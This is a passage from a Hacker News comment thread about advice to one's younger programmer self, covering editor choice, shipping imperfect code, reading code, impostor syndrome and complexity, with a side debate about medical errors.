\"productive right away\" - you wouldn't even know how to input text or save a file) whereas you had apparently never tried vscode before. How can that be a fair comparison? reply trustno2 5 hours agorootparentprevAnd it's fine. Do what works for you. I just don't think playing with editor endlessly is a well spent time. It makes you feel like you do actual work when you don't. In my opinion. reply lemonwaterlime 5 hours agorootparentYou only play with the editor endlessly if you’re the type of person to play with the editor endlessly. My vimrc was set up over the years a bit at a time based on my needs. After several years, I did an overhaul based on what I truly need and don’t need from experience. I rarely change anything in it these days. Maybe a few lines if I start using a new language. With that stated, most of my vim use is still understanding buffers and motions, which takes no configuration. reply naught0 3 hours agorootparentprevThese days you can write your neovim config in a real language -- lua. I used a pre-defined config called Lazy that does everything vscode can. Then I started tweaking shortcuts, removing and adding plugins, learning more lua. Then, after I knew what I wanted, I wrote my config from scratch with only the plugins and settings and keybinds I wanted. It was a very fun process for me. I enjoy simply using my editor. It makes me want to code. I don't get that same level of joy or customization from vscode -- which is phenomenal software btw. e: replied to the wrong comment in the chain, but the point stands! Customization is how I got into programming. Crafting a status bar on linux, tweaking colorschemes, etc. Don't hate on the tinkerers just because it's not how you enjoy to work. It can be immensely valuable reply TillE 2 hours agorootparentprevThe VS Code launch settings crap is a mess. But like as an editor, it's an editor. You can just use it like that. It works well and has good defaults, you can open a terminal with a hotkey, etc. reply corytheboyd 4 hours agoparentprev100% agree about defaults. I do think it’s critical you actually learn the features of you IDE. Yes being able to type fast has nothing to with programming, but being able to jump to symbols, make refactors, use keyboard shortcuts etc. reduces the gap between hands and brain. reply DavidWoof 5 hours agoparentprevI don't think this point is about configuring your editor/environment as much as just knowing it. There's certain features that come up all the time: find file, find class, go to implementation, find references, rename var, etc. It stuns me how many devs do this stuff manually, when virtually all editors/ides have ways of doing these things. reply darby_nine 4 hours agorootparentIn some ecosystems, the tooling is just not that good. To use ruby on rails as an example: if you lean into the IDE's expectations for code layout it works ok, but there will always be generated methods and variables with nothing to show but the name—no documentation, no source, no googleable identifier, nothing. In these cases there's nothing to do but pull out the rails (or library) source to try and discern their intention. In my experience, lisp also has this issue of being very difficult to tool in a general sense, as did aspects of writing c/c++ years ago (maybe recognizing stuff like macro-generated symbols has improved by now). reply skydhash 2 hours agorootparent> lisp also has this issue of being very difficult to tool in a general sense Most of the common lisp tooling is already present in the language itself. Things like inspect, trace, describe and apropos already gives you the equivalent of most IDEs. I agree with you for some dynamic language and magic methods. It can be hard to trace back the exact function that are being called. But you can always design some tooling for it as long as the code follows the ecosystem convention (Laravel plugin in PhpStorm). The nice thing about Vim (and other configurable editors) is how easy to mesh existing tooling with the editor itself, without requiring for that extension to be a whole project unto itself. reply fragmede 6 hours agoparentprevWhen you began coding, was there vscode? These days there's lazyvim to let you skip all that fine tuning if you want to \"just use vim\". reply posix86 5 hours agoparentprevVSCode can also be used more or less effectively though. There are quite a few shortcuts & tricks that can make you 10x more productive, even if maybe it's not as much as vim. reply sethammons 2 hours agorootparentMulti-cursor on ten lines, sure. You get 10x for some seconds or maybe minutes. I'd expect practically zero people have gotten 3x more productive over a two week period for having advanced knowledge of tips and tricks in their editor. Saying 10x seems a wild exaggeration reply moonshinefe 17 minutes agoprevGood post, I agree with most of it. One that goes hand-in-hand with \"just ask the question\" is learning to know when to pivot. If you've hit a blocker, whether it's something to do with waiting on a teammate, client, or answer to a hard question, consider pivoting to another task to knock out some easy wins. Ideally the task you pivot to should require minimal context switching to get going. This way you won't lose productivity. Often if the blocker is a hard problem and you go back to it later, you might have a good idea after stepping away for a bit as a bonus. reply mannykannot 5 hours agoprevI like this a lot. While those commenters who say it is too advanced for novices have a point, I feel these are still issues worth thinking about - and coming back to - as they learn. The one exception is “Bad code gives you feedback, perfect code doesn’t. Err on the side of writing bad code.” My experience with bad code is that it does not tell me much; instead, it presents inscrutable and baffling mysteries. From the caveats and examples, I think the author is trying to say something rather different; something like “don’t obsess over completeness” or other concepts of ideal software - especially, I might add, dogmatic concepts of this nature. reply dgb23 2 hours agoparentThe Bad Code advice is for people who have the tendency for perfectionism (apparently like the author 15y ago). My advice to me: write simple, dumb, repetitive code, but make an effort to be consistent. Consistent, dumb code is really easy to visually parse. The repetitions slide into the background and the differences stick out. The more code there is, the easier to see what goes together (data aggregates/structures), what the overall flow should be (control, conditionals, order etc.). Then it's easier to factor things out or how to express more clearly what the code does. But again, consistency is key. The code can be \"bad\", but it's very beneficial to do simple edits like renaming and reordering of things, grouping them under succinct comments so the structure stays clear. Younger me would do the opposite: inconsistent code that is complex. I think its impatience that gets in the way, rushing to build abstractions and factoring out things way too early or trying out competing ways to express the same kinds of things (playing around with code). Every programmer has their own tendencies and their own journey, so they need to hear different advice, in order to ignore it for now, but to have an AHA moment at some point when they realize why the advice was given. reply andai 1 hour agoparentprevI think this could have been phrased as, err on the side of shipping faster. i.e. in most cases the cost of bugs is so low that the benefits of a faster feedback loop greatly outweigh the benefits of a more rigorous development process. (On top of that, the number of defects asymptotically approaches zero with greater effort invested, i.e. diminishing returns.) reply trashburger 2 hours agoparentprevI think you got the wrong idea from that sentence; the author is talking more about the feedback you get from your end-users and/or customers, rather than development feedback a la debug info. reply marcusbuffett 1 minute agorootparentNo I actually do mean the feedback you get as a developer when you realize which “bad” decisions actually end up being tech debt and which were totally fine and just saved time reply wruza 5 hours agoprevNot sure what 15 years means, but if that’s where I started: (Blasphemies warning) - Skip low level and go as high as you can. Ditch C, assembly, hardware. Take python, ruby, js. Never touched C++ cause it’s awful? Good. - All the money is in the hands of a client. If you’re taking it from someone else, best case you’re taking less than a quarter for essentially the same job. Useless leeches everywhere who perceive you as a magic money generator. Go around them once you’re confident. - Read sicp, htdp, taoup, but don’t take them to heart. Seriously, extensively test any idea you learn against reality, cause ideas may sound excellent out of context. - Pragmatic is the only way. Don’t listen to industry peasants jumping through imaginary hoops, they are crazy. Religion in programming is worse than religion irl. There’s insane amount of it in programming. Don’t argue, let them be. It’s actually easy to test approaches by yourself and learn your own ways. Most of these are just habits making no difference once learned. - Doing something together only turns out faster if you’re very good communicators. Good communicators are rare and you are not the one. reply 93po 3 hours agoparent> All the money is in the hands of a client. If you’re taking it from someone else, best case you’re taking less than a quarter for essentially the same job. Useless leeches everywhere who perceive you as a magic money generator. Go around them once you’re confident. My better advice would be to avoid work that involves outside clients unless you own your own shop or freelance for yourself. They're always going to be price and deadline sensitive in a way that makes for shittier work conditions and lower pay. Working on well-funded internal projects that generate revenue is the way to go. Your work conditions are also going to be much nicer because a client being an asshole can't be used as an excuse for constant overtime or other BS. reply simonw 5 hours agoprevThis was great. I particularly enjoyed the \"Bad code gives you feedback, perfect code doesn’t. Err on the side of writing bad code\" section, I'd never thought about how spending time writing \"perfect\" code means you don't get to figure out which aspects of that code actually matter. reply BiteCode_dev 6 hours agoprevThose are way too abstract advice when you start programming. You can only understand them because you lived those situations, which implies experience you don't have. I would say (specifically to my young self): - There is no substitute for doing. Less tutorials, more coding. - Stop being obsessed with quality: you are not at the level where you can provide it yet. Do dirty. Do badly. But ship. Some people will be mad at you, and they are right. But do it anyway. Yes, reboot the servers with users on it. Yes, commit the spaghetti. You'll reach the level you want to avoid doing all this. - The users don't care about the tech. They care about the result. - Doing something for the hell of it is worth it. Just make it separate from the point above so they don't conflict. - Programming is a battle against complexity. Again and again. Put that on a post-it. Make your decisions based on it. You will suck at it, but try. - You have imposter syndrome because you are an imposter. You are really bad. It's ok, doctors hurt people for years while learning to save them. Don't sweat it. It will come. - You need faith it will work out. On the long run, you'll get better at this. But in the short term also. You'll find the bug. You'll figure out the solution. It will happen if you keep at it even if it can be frustratingly long and unfair. Even if it doesn't feel like that right now. - The right team is way more important than the right tech. If you are alone, get in touch with people who will lift you up from time to time. reply jerf 4 hours agoparent\"Those are way too abstract advice when you start programming.\" I have come to the conclusion that the use of these sorts of posts is not that the reader, young or otherwise, will instantly and correctly apply all the lessons to their lives. It's more about sensitizing people to problems they may not currently see, and solutions they may not currently be aware of. It's about shortening the learning curve, rather than eliminating it. A 1-year programmer is not going to read themselves into a 20-year programmer, no matter what they read. But at the 5 year level I think you'll see a lot of difference between someone who never considers their craft and never pushes themselves, just keeps their heads down and doing the next bug, and the person who has even just occasionally read this sort of post, pondered how it may apply to their current situation, and taken out of it what they can... which may be something completely different than what they take out if they read the exact same post two years later. reply password4321 3 hours agorootparentYes, countering \"you don't know what you don't know\" reply marcusbuffett 6 hours agoparentprevThese seem just as abstract as mine, if not more so, plus at least I provided examples where I could. Feels weird to criticize my post for general advice + examples, then come up with your own general advice without examples. Also this was just an analogy I know, but doctors definitely don’t hurt people for years while trying to save them, very different profession from ours, if anything doctors earlier in their career have been shown to have better results. reply aniviacat 3 hours agorootparentI think you are trying to address different audiences. While your tips are mostly targeted at people who are already working as programmers, the parent comment's tips are mostly targeted at complete beginners. E.g. this tip: - There is no substitute for doing. Less tutorials, more coding. is directly addressing a common mistake for absolute beginners. Many beginners will read (or worse yet, watch) loads of coding tutorials while doing little themsves. It is an issue a complete beginner encounters and understands. Your tip on the other hand: > If you (or your team) are shooting yourselves in the foot constantly, fix the gun is addressing people working on medium to large projects with internal tooling. That is not a situation a complete beginner finds themselves in; it's a situation someone who already works in programming for a while finds themselves in. I wouldn't necessarily say your tips are too abstract; they are simply too high level for a complete beginner. That is not necessarily a bad thing; perhaps the you of 15 years ago already had the basic understanding necessary to be able to comprehend and make use of your tips. reply imhoguy 2 hours agorootparentprevI think you both provide some kind of generational advice, like parent serving kid with life advice. Unfortunatelly, or fortunatelly, they will have to learn it by experiencing own failures first. reply aiisjustanif 2 hours agorootparentprevI really liked “You should know all the major shortcuts in your editor. You should be a confident and fast typist. You should know your OS well. You should be proficient in the shell. You should know how to use the browser dev tools effectively.” Typing skills are severely underrated in order to professions and roles adject to our professions like PM. reply penteract 5 hours agoparentprev> There is no substitute for doing. Less tutorials, more coding. This may be good advice for yourself in the past, and for many people at lots of times, but I'd hesitate to give it as general advice. Reading code others have written should not be understated as way to learn valuable things from fundamental patterns and algorithms to language features and idioms. If you have a job in a team, this may happen anyway, but it's possible to write lots of code without realizing there's a better way. reply supriyo-biswas 5 hours agorootparentAlthough, I should point out that reading code is not the same as reading tutorials. Reading code occurs with a kind of intent and focus that is missing when you don’t know much, and thus you may end up falling into the trap of studying multiple tutorials without really trying out much yourself. reply penteract 4 hours agorootparentTutorials include some code which is intended to be exemplary and simple enough for a new programmer to make sense of, so I wouldn't discount it as a part of reading code. Practical code does not always have those properties, although you'd certainly be missing a lot if you only read code from tutorials. I completely agree with the claim \"There is no substitute for doing\", and I might even say that code you read without running and tweaking it doesn't count. reply cess11 3 hours agorootparentTrying to learn to become a developer from tutorials is like trying to become a carpenter by reading instruction manuals for saws, nail guns, &c. To learn how to implement computer programs, read books about it. reply penteract 6 minutes agorootparentWe might have different ideas about what constitutes a tutorial. Online tutorials vary massively in quality, but something like the official Python tutorial https://docs.python.org/3/tutorial/ is a fine resource. I would even say that the categories are not mutually exclusive - I would call \"Structure and Interpretation of Computer Programs\" both a book and a tutorial. Different people probably find different resources most helpful. Also, \"To learn how to implement computer programs, read books about it.\" contradicts the original comment's \"There is no substitute for doing\" more than I'm happy with. reply CM30 2 hours agorootparentprevI'd definitely agree that reading others' code can be a good way of learning, especially if you take the time to disassemble it line by line and look up things like what language features and functions they're using, how it's structured, etc. reply BiteCode_dev 5 hours agorootparentprevIndeed it's not general advice, it's to me specifically, who used to procrastinate a lot under the guise of learning. reply northrup 5 hours agorootparentSame. I would fall into the same trap. One more article, another tutorial, another chapter of a book… juuust to make sure I understood the concepts; and what actually helped? Just coding, getting it wrong, fixing it, getting it wrong, fixing it, etc. reply ffsm8 5 hours agorootparentprevBut you're not going to realize which way it's better unless you've written the bad code before. reply BiteCode_dev 4 hours agorootparentTangential, but I think that's the problem with trying to learn from design patterns. I read about them and tried to apply them. That's backward and didn't produce anything good. I started to understand them by doing it the other way around: - Coding, solving problems. - Reading other people's sources. - Then reinventing half a terrible design pattern. - Later on, looking at a book: \"ohhh, that's what I tried to do\" or \"ohhh, hence the snippet in that source\". - Now I can discuss with people about the pattern and name my code entities according to that. Design patterns are a communication tool. reply PartiallyTyped 5 hours agorootparentprevI think reading code to understand because you forked a project and want to continue it is very different to following tutorials. reply jameshart 5 hours agoparentprev> You have imposter syndrome because you are an imposter. You are really bad. It's ok, doctors hurt people for years while learning to save them What in the medical malpractice? reply cqqxo4zV46cp 5 hours agorootparentMaking a mistake or a reasonable but ultimately incorrect call is not malpractice. Doctors are just people, just like the rest of us, and certainly you. It’s scary if you think that the medical system is more of a safety net than it actually is, but your gripe is with the precarious nature of life, not medicine. reply jameshart 4 hours agorootparentFiguring out how to be a doctor by faking it til you make it most definitely is malpractice though, and ‘don’t worry, you’re an imposter but you only learn by screwing up’ is very much not how doctors learn their job. The Hippocratic oath is not ‘first, do some harm, as long as you’re learning’. reply ponector 5 hours agorootparentprevA recent Johns Hopkins study claims more than 250,000 people in the U.S. die every year from medical errors. It is ok to be an imposter. reply jameshart 5 hours agorootparentIs it your impression that the medical profession thinks that’s ok? reply BiteCode_dev 5 hours agorootparentShow me a hospital, and I'll show you overworked, under slept young doctors that have to deal with paper work, and are swimming in a field with heavy lobbying. But even without this, the thing is, when you don't know, you will make mistakes. And when your job is to take care of people, mistakes hurt them. It's the nature of things. Last year I had 3 medical errors, one that almost got me killed, by very well-meaning professionals. Closing your eyes and pretending it doesn't happen is naive at best. But people have to start somewhere. They can't stay in theory forever. And no amount of preparation will save you from making terrible mistakes. Since we can't put an experienced doctor behind every intern 24/7, there is no real solution to this for now. Same for programming. reply whamlastxmas 5 hours agorootparentprevThe medical industrial complex clearly thinks it is, otherwise there would drastically lower patient loads, allow more spots for medical school, and provide better working conditions that would allow for fewer mistakes. None of this is happening and is an implicit acceptance of medical error deaths reply 4RealFreedom 5 hours agorootparentprevYes. Nothing is perfect. The remedy they've chosen is to rely on insurance. There is a reason we call doctor's offices 'practices'. reply switch007 4 hours agorootparentYou think they're called practices because of the less common usage of the term to mean an amateur learning something, to imply they're inexperienced/without training? Rather than it being the place where a practitioner works? (\"someone whose regular work has involved a lot of training\") reply thfuran 4 hours agorootparentprevThere is, but it's not what you're implying. reply patrick451 5 hours agorootparentprevThey obviously do. Just look at the way they run residency programs. They work those poor kids to the bone under minimal supervision. Only the most disingenuous can pretend it's an accident when something goes wrong. The system is clearly designed to harm people. reply goosejuice 4 hours agorootparentprevYeah let's go build some shoddy bridges and crash some planes while we're at it. Individuals can be new to a practice and feel like imposters but we shouldn't be pointing to statistics like this as an example of why it's ok. I can't believe people think like this. reply BiteCode_dev 4 hours agorootparentPlanes and bridges are problems where the quality control can be centralized and you can therefore put a lot of redundancy. Even then, the Boeing scandal shows it's not bulletproof. It's not the same for medicine. There are way more doctors than you can put safety nets. Also, when a plane crashes, it's on the news, it costs money and PR. Much less so with doctors. The plane industry is not inherently more moral, just more liable. Responsibility in the health industry is way more diluted. It's not that we WANT to pay the price of people learning. I wish I would not have had the wrong meds given to me last year. It's just that the system is not currently set up to do it otherwise. So you can feel guilty and stop moving, and you will not learn. You will not grow. And you will actually hurt people for a longer period because you will still make mistakes. Or you can own it and accept the inevitable: doing things means having actual consequences on the world. If you want, you can dedicate your life to change the whole system and make it better. But I don't think anybody in this thread is doing that right now. I did see a lot of people on their high horses, but doing nothing though, paralyzed because they were looking for a way to never break anything. Me, for example. For years. reply goosejuice 4 hours agorootparentSure, we're human. There is no argument there. However, normalizing the loss of human life as part of the learning algorithm is psychopathic. There's a time and a place to make mistakes... In mission critical situations that's in training and everywhere else we should aspire for safeguards that prevent the loss of life due to mistakes. In medicine a lot of these deaths can be prevented through greater care. It's not different than engineering in that respect. The greater problem is decision makers putting profits over life. And this kind of mentality in this thread is just fuel for that kind of behavior. It's gross. reply babel_ 3 hours agorootparentI think you're misreading a singular opinion as occurring between two disparate points here. The initial phrase was > doctors hurt people for years while learning to save them It's then a separate reply from someone else about deaths from errors/malpractice. So, nobody seems to be expressing the mentality you are, correctly, lambasting (at least so far as I've read in the comments). But, as it is relevant to the lessons we'd all want to pass back to ourselves (in my opinion, it's because we wish to hold ourselves accountable to said lessons for the future), let's address the elephant in the comment. Normalising deaths, especially the preventable ones, is absolutely not something that anybody here is suggesting (so far as my read of the situation is). Normalising responsibility, by recognising that we can cause harm and so do something about it, that seems far more in-line with the above comments. As you say it yourself, there's a time and a place, which is undoubtedly what we hope to foster for those who are younger or at the start of learning any discipline, beyond programming, medicine, or engineering. Nobody is saying that the death and loss is acceptable and normalised, but rather that in the real world we need a certain presence around the knowledge that they will occur, to a certain degree, regardless. So, we accept responsibility for what we can prevent, and strive to push the frontier of our capacity further with this in mind. For some, that comes from experience, unfortunately. For others, they can start to grapple with the notion in lieu of it through considering the consequences, and the scale of consequence; as the above comments would be evidence of, at least by implication. These are not the only ways to develop a mindset of responsibility, fortunately, but that is what they can be, even if you find the literal wording to suggest otherwise. I cannot, of course, attest to the \"true\" feelings of others, but neither can anyone else... But in the spirit of the matter, consider: Your sense of responsibility, in turn, seems receptive to finding the areas by which such thinking can become justification for the very thing it would otherwise prevent, either as a shield purpose-built for the role or co-opted out of convenience. That too becomes integral, as we will always need to avoid complacency, and so must also promote this vigilance to become a healthy part of the whole for a responsible mindset -- lest we become that which we seek to prevent, and all that. Exactly as you say, there's a greater problem, but this thinking is not necessarily justification for it, and can indeed become another tool to counter it. More responsibility, more mindfulness about our intents, actions, and consequences? That will prove indispensable for us to actually solve the greater problem, so we must appreciate that different paths will be needed to achieve it, after all, there are many different justifications for that problem which will all need to be robustly refuted and shown for what they are. Doing so won't solve the problem, but is rather one of many steps we will need to take. Regardless, this mindfulness and vigilance about ourselves, as much as about each other, will be self-promoting through the mutual reinforcement of these qualities. If someone must attempt to visualise the staggering scale of consequence as part of developing this, then so be it. In turn, they will eventually grapple with this vigilance as well, as the responsibility behoves them to, else they may end up taking actions and having consequences that are equivalent to the exact mentality you fear, even if they do/did not actually \"intend\" to do so. The learning never ends, and the mistakes never will, so we must have awareness of the totality of this truth; even if only as best we can manage within our limited abilities. reply DrBazza 4 hours agoparentprevFrom 30+ years of dev work: > - There is no substitute for doing. Less tutorials, more coding. I'd rephrase that as \"just write something!\" Many times I find myself being the classic example of 'perfect is the enemy of good' - I'll think about the perfect solution, rather than write something *now*, that works, and refactor towards perfect. TDD and all that. Other things: - Beware the beta and the boss. If it works, it will invariably get shipped if your manager sees it. Many managers cannot put a value on the future cost of maintaining something that's barely good enough. - Classic Confucius: \"I hear and I forget. I see and I remember. I do and I understand.\" If you're interested enough to read about some tech/language/framework, write something (again!). - Learn at least one other language and ecosystem in addition to your main one. Even if it is syntactically similar (C++, Java, C#, for example). reply graypegg 6 hours agoparentprevA bit snarky, but I would add - don’t read opinions from a list and take it as gospel. Adapt to the jobs you’re in, and you’ll develop your own opinions, but now with experience to explain why. Opinions are formed by getting repeatedly hit with the consequences of your (and other’s) decisions, and everyone just has to take enough hits till the pattern seeking area of your brain takes over. reply FLT8 5 hours agorootparentMaybe add to that: try to stay long enough in a role to really feel the consequences of your actions. Even better if you're on pager for a while too. I know it's not trendy to stay in a job for long these days, and conventional wisdom is it's not great for your salary either, but one thing it will do is allow you to understand whether decisions you made were actually good or not. There are roles I've been in where it's only been years later that the true impact of decisions made was actually apparent. I'm glad I hung around long enough to experience that. reply mgkimsal 4 hours agorootparentI've been called back to code long after I left an org, and have had to review my own code 10-12-15 years after the fact. Seeing both the positive and negative aspects of decisions having played out in the real world was something it's hard to get from reading, and I'd argue somewhat harder to get even if you stay inside the same org for that length of time. Staying on the inside, you'll rationalize a lot of the changes to the code, the team and org over time, and it may be harder to be more objective about the impact the code has had. I was quite proud of some decisions, but realized the negative long term impact of others. Trying to share that experience and whatever 'wisdom' or 'lessons learned' with others has been its own challenge in some situations, because you can easily come across as \"the old person\" who doesn't \"get it\" wrt to current trends. Some issues are evergreen and fundamental, but it's difficult for less experienced people to understand why some of these things are really core. I'm not sure there's much substitute for experience in many cases. reply scott_w 5 hours agorootparentprevI wholeheartedly agree with this advice and have for over a decade now. I think there’s something in the fact that you know you caused that that helps the lesson stick. Potentially you will understand the assumptions you had then vs now that allows you to clearly see the underlying lesson to take. reply BiteCode_dev 5 hours agorootparentprevSkin in the game is important. I have a terrible programmer friend. He is better at creating actual products than most people I met because his livelihood is on the line: he makes money only from websites. So he is not living in the abstract idea of best practices, he had to make it profitable for the last two decades, with little resources to go by on top of that. And he does. After 10 years, he is still asking me how to write git commands. And I'm still learning from him to shed a lot of BS from my practices. reply intelVISA 3 hours agorootparentBeing directly chained to the financial outcome of your works will have you dropping Scrum for Scheme real quick... reply efortis 6 hours agorootparentprevI agree, form your opinions when you have enough information. For example, if you can’t decide between two data structures or tech, pick one and add a comment: // I’m not sure reply BiteCode_dev 6 hours agorootparentprevI agree, and would say is equivalent to: > - There is no substitute for doing. Less tutorials, more coding. reply graypegg 6 hours agorootparentYes true. Mostly just opining on the “list of everything you gotta’ know” is a bit TOO concrete IMO. (As opposed to too abstract) I was quoting out of similar things years ago at the start of my career, “it should be done this way because X said it” didn’t help me at all. It feels like insulation against being called too junior, since, you can just wholesale adopt someone else’s list of ideas and you’re good. But making mistakes because you’re new to the career is precisely what forms the base of those opinions in the first place. reply karmakaze 4 hours agoparentprevMost of these lists do not advise on \"programming\" the task but rather \"programming\" the job/position. There's no problem with that, I'd just wish it was labelled \"software engineering advice\" or \"advice for programmers\". Few of the points are about programming itself and the list is overall pretty good. Consider this just a rant from an older programmer who hasn't fully recognized that 'programming' is now largely a social endeavor with online info for everything, language and library ecosystems, etc. I wonder how much of this information I would have internalized if it were all available in my time. Seems like the kind of thing I might read and nod in agreement and forget to apply when relevant without some hard earned run-ins (which is how I'd picked them up). As for actual programming advice, the thing I'd highlight is to look at the data first and foremost. It goes from initial conditions to post conditions. The differences are what your program/function does, but both the pre/post conditions should be able to be fully described as a valid static state. Once you understand that, the problem, the code is largely plumbing with a small part that applies the functional transformation. There's so much focus on the form and style of \"the code\" that seems to consider it the main thing rather than an artifact of getting the main thing done: think any time there seems to be fancy abstractions that don't provide value to offset its complexity. To relate it to a point in the post, if you can't connect the difficulty you're having with the logical transformation that needs to be done (e.g. from database state to state), it's likely self-inflicted (or it could be due to a poor choice of database schema). Similarly for poor choices of request/response formats--basically bad plumbing between systems (and not intrinsically hard because of the information being handled). reply ourmandave 5 hours agoparentprevStop being obsessed with quality: you are not at the level where you can provide it yet. Do dirty. Do badly. But ship. You'll reach the level you want to avoid doing all this. What if future you has reached that level and people on your team are shipping spaghetti? reply rileymat2 5 hours agorootparentI feel like this is bad advice, really, you need to be obsessed with quality and growth, but you can't let that stop you from shipping. Try for clean to the best of your ability in the time constraints you have, but accept that it will be dirty. reply graypegg 5 hours agorootparentI think aiming for clean is good, but it’s really hard to pin down what clean means when you’re starting out. I feel like just emulating what you see in your first few jobs is ideal. (As in, ask coworkers who know the thing you’re working on) It could be great code to be inspired from, or mediocre. Either way you get some input about what decisions result in what outcomes, and what the outcome “feels” like. And if it comes time to change one or many of those decisions later on in this codebase, the person doing it gets a uniform codebase to work from! Unique abstractions and fixes in random places makes refactoring harder. reply BiteCode_dev 4 hours agorootparentprevObsession will stop you from shipping. Or it's not an obsession. It's caring. Very few people can pull off a Steve Job level of nitpicking and actually finish a project. I certainly couldn't, and that advice is for young me. reply intelVISA 3 hours agorootparentprevThen you find a new team, else you can do the classic 'making one trivial hill your Happy Path and be prepared to die on it' routine. reply neilv 4 hours agoparentprev> Doing something for the hell of it is worth it. Just make it separate from the point above so they don't conflict. This is a great use for new, standalone open source modules: feel free to experiment with styles or techniques or goals that you wouldn't want to justify. (Or for experiments that you start and then abandon without ever showing anyone.) For example, when I was making lots of packages to help build out the Racket ecosystem, I'd already made an HTML-writing package, but I felt a craving to do one that used syntax extension at compile time, rather than dynamic s-expressions. So I just did it, as a separate package: https://www.neilvandyke.org/racket/html-template/ I don't recall anyone saying they saw value in it, but I like it, and I scratched that itch, and added another skill to my programming mental bag of tricks. reply cm2187 5 hours agoparentprevA way to rephrase your point about complexity is this wonderful quote \"Developers are drawn to complexity like moths to a flame, often with the same outcome\" (Neal Ford) reply spoiler 4 hours agorootparentI've experienced this too, but I never understood why this phenomenon happens. Is it because we start adding abstractions before we understand the problems? Like, there's a certain threshold where keep things too simple makes them too complex, so people start introducing abstractions to reduce complexity. But often it's the wrong abstractions and then we accidentally end up with worse complexity that's harder to unravel. There must be a term for this waves hand thing? Edit: gosh typical on phones is hard reply layer8 3 hours agorootparentIt’s because when you’re in the middle of things with a lot of context in your head, adding another little wrinkle feels like a negligible complication (in particular if the new wrinkle is ostensibly to reduce some complexity, or to ship more quickly), but those complications accumulate up to the limits of any developer’s comprehension (and beyond) rather sooner than later. Hence developers tend to work close to the limit of what they can handle in terms of complexity, which for anyone who hasn’t all the same context in their head (like the developers themselves some time later) is really more than they can handle in an effective manner. From another perspective, this is a form of entropy: There are many more ways to increase complexity than to reduce it. This is also the reason why biological life has been getting more complex over time, the only criterion being if it’s fit to survive and reproduce. reply devctx 4 hours agorootparentprevThe commonly used term, also mentioned by Fred Brooks, is accidental complexity. Accidental highlights the non intentional nature of devs introducing complexity. reply spoiler 4 hours agorootparentIsn't accidental complexity just complexity that's not part of the problem domain? Say in the context of serving content/downloads, accidentally complexity would be caching, proxies, CDNs (etc). Basically stuff that we have to deal with to handle or optimise downloads, but isn't inherently part of the \"just downloading files\" problem? reply dano 6 hours agoparentprev* This * - The users don't care about the tech. They care about the result. reply bdw5204 5 hours agorootparentTo the extent users do care about the tech, they care about performance not how \"clean\" the code is or whether you're using the newest framework. Users hate when software is slow or uses an exorbitant amount of memory. reply bazoom42 5 hours agorootparentMost users have no idea how much memory a piece of software uses. They care about user experience though which means they will care if the UI hangs or is unresponsive. reply graypegg 5 hours agorootparentBingo. I’d go further and say they don’t care about your application at all. They just want to do something, and your application’s quality is measured by how little it stands in the way of accomplishing that. The sad fact is this encapsulates features (ease of development, a framework probably does help you ship faster), adaptability (clean abstractions that are easy to work with), and performance. Finding that balance is always going to be hard but they’re all important! reply imhoguy 1 hour agorootparentprevAnd if the product is aimed at prousers/communities who extend the functionality themselves with their own commands, scripts and plugins. reply dano 5 hours agorootparentprevYeah, I totally agree. Those other factors are internal optimizations. What gets me is when a team wants to switch horses to new tech and do a forklift upgrade just to implement something using the new hotness. reply CM30 1 hour agorootparentprevThis 100%. It's especially noticeable in the world of game development, where you see games that are ridiculously buggy and poorly made (on a coding basis) selling millions of copies and changing the industry. The original generation 1 Pokemon games are probably some of the best examples of this, though I'm pretty sure anyone who's reversed engineered any game from the Atari era onwards has probably been left wondering \"what the hell were they thinking?\" But it doesn't matter. They were designed well, they were fun to play, and millions of people enjoyed them. reply TheRoque 4 hours agoparentprevI never really got the \"it's ok to be an imposter\", \"it's ok to be bad\" part... And the internet is full of people saying things like \"I am a developer and I have no idea what I'm doing haha\". Seriously, you might be inexperienced or not know everything, but you should clearly not be an imposter and you should be confident in your ability to improve and understand what you don't understand yet. Take responsabilities and ownership in what you do, don't get behind the easy excuse that it's too complicated. You are the professional and you are getting paid for this. reply thfuran 5 hours agoparentprev>Do dirty. Do badly. But ship. Some people will be mad at you, and they are right. But do it anyway. Yes, reboot the servers with users on it. Yes commit the spaghetti. You'll reach the level you want to avoid doing all this. I think you're likely to reach that level a lot faster by trying and failing than by not trying at all. reply johnisgood 6 hours agoparentprevI have a very severe case of impostor syndrome. :( reply bregma 5 hours agorootparentDon't worry, you're not a real imposter. You've just inadvertently ended up in a position where you're expected to be one. Just fake it until you actually become a true imposter. reply BiteCode_dev 4 hours agorootparentprevYou probably are. But most of your colleagues as well :) Most adults are kids in big meat suits, they fake it a lot. I started to live like I was not completely worthless at 35. Not saying that to be proud of it, just stating that if you think humanity should do better, the first person you'll judge is you. It will be glaringly obvious you are not meeting your own standards. The higher your standard, the longer it will take for you to reach them. And the way to get there faster is to ignore the shame, and do it anyway. Because if you don't, your growth will be slower, and you will do more damage for longer. Real life means real consequences. It will make you more tolerant of others as well. Way more tolerant. reply lioeters 6 hours agorootparentprevIn a world of imposters, the half decent imposter is king. reply ryandrake 4 hours agoparentprev> - The users don't care about the tech. They care about the result. Seasoned, grownup engineers and tech business leaders are forgetting this, even today. Users don't care that your product is made with AI, but techies just will not shut up about Generative AI, LLMs, Transformers and all this shit that should be implementation details. Users don't care about any of what goes into the sausage. reply bazoom42 3 hours agorootparentInvestors care though, and for many startups the customer they need to appeal to is investors. reply ryandrake 3 hours agorootparentI don't understand why investors care, either. Product A is made with traditional algorithms, product B is made with AI and LLMs, product C is made with literal magic and wizardry. But they all do exactly the same thing. Why does an investor prefer to invest in product B? reply Zenzero 5 hours agoparentprev> It's ok, doctors hurt people for years while learning to save them. Modern medical education doesn't work this way. reply BiteCode_dev 4 hours agorootparentYeah, I'm surrounded with medical professionals. It totally does. They make grave mistakes all the time. And they hide them. They lie about them. They have their ego and career on the line. And they don't have enough resources at their disposal, not enough hours, too many patients, and they are exhausted. In short, they are humans in a human system. reply piterrro 6 hours agoprev> If you can’t easily explain why something is difficult, then it’s incidental complexity, which is probably worth addressing. This one is good and has been following me since I've became a manager. Thanks to you, I know how to apply that objection to \"press\" people when I feel we're dealing with this kind of complexity. reply hinkley 2 hours agoprevThe trick is not in having advice to offer. It’s in having advice they will hear. Next month I’ll have been working in software for 30 years. Which means I would have a lot more common ground with me 15 years ago than most people will. that me with five years’ experience might not have understood at all. Me with five years’ experience suspected many things that were true but missed some important one. I’d probably have to feed his ego by confirming some of those things before moving on to the difficult bits. But who is to say that me with less Impostor Syndrome would be a better person? No, the main value in learning from the past is improving the future, not nostalgia or regrets or what ifs. reply Scubabear68 4 hours agoprevThe author’s comments about knowing your business context and the potential impact of bugs really hit home with me. I have seen far too many teams using 